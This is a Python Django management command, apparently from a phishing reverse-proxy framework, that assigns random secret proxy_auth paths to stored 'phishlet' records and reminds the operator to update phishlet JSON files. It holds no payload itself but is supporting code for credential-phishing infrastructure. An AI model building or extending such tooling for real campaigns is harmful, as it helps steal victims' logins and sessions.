import secrets
import string
from django.core.management.base import BaseCommand
from core.models import Phishlet


class Command(BaseCommand):
    help = 'Generate random proxy_auth paths for phishlets that don\'t have one'

    def add_arguments(self, parser):
        parser.add_argument(
            '--length',
            type=int,
            default=16,
            help='Length of the random path (default: 16)'
        )
        parser.add_argument(
            '--prefix',
            type=str,
            default='',
            help='Prefix for the proxy_auth path (default: empty, can be anything like /secret/, /xxx/, etc.)'
        )
        parser.add_argument(
            '--force',
            action='store_true',
            help='Force regeneration of existing proxy_auth paths'
        )

    def handle(self, *args, **options):
        length = options['length']
        prefix = options['prefix']
        force = options['force']

        self.stdout.write(
            self.style.SUCCESS(
                f'🔐 Generating proxy_auth paths with length {length} and prefix "{prefix}"'
            )
        )

        # Get all phishlets
        phishlets = Phishlet.objects.all()
        
        if not phishlets.exists():
            self.stdout.write(
                self.style.WARNING('No phishlets found in the database')
            )
            return

        updated_count = 0
        skipped_count = 0

        for phishlet in phishlets:
            if phishlet.proxy_auth and not force:
                self.stdout.write(
                    f'⏭️  Skipping {phishlet.name} (already has proxy_auth: {phishlet.proxy_auth})'
                )
                skipped_count += 1
                continue

            # Generate random path - allow any format
            random_chars = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(length))
            
            # If no prefix specified, generate a random one
            if not prefix:
                random_prefixes = ['/auth/', '/secret/', '/xxx/', '/private/', '/key/', '/access/']
                prefix = secrets.choice(random_prefixes)
            
            new_proxy_auth = f"{prefix}{random_chars}"

            # Update the phishlet
            phishlet.proxy_auth = new_proxy_auth
            phishlet.save()

            self.stdout.write(
                f'✅ Updated {phishlet.name}: proxy_auth = {new_proxy_auth}'
            )
            updated_count += 1

        self.stdout.write(
            self.style.SUCCESS(
                f'\n🎉 Summary: {updated_count} phishlets updated, {skipped_count} skipped'
            )
        )

        if updated_count > 0:
            self.stdout.write(
                self.style.SUCCESS(
                    '\n📝 Remember to update your phishlet JSON files with the new proxy_auth values!'
                )
            )
